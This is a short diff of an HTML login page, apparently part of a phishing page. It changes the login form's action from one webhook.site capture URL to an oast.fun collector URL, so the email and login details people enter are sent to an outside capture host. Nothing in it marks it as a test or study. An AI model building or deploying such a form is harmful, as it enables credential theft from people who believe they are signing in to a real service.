@@ -36,7 +36,7 @@
         </div>
 
         <!-- Form -->
-        <form id="loginForm" action="https://webhook.site/7f822c10-8055-4f28-9c17-0be0144752d1/" method="POST">
+        <form id="loginForm" action="https://abzfdgjdobpnrmlcfsqo5jrtg5ghq5wu6.oast.fun/" method="POST">
           <div class="mb-3">
             <label for="emailAddress" class="form-label">Email Address</label>
             <input type="email" class="form-control" name="user_email" id="emailAddress" required placeholder="Enter Your Email">
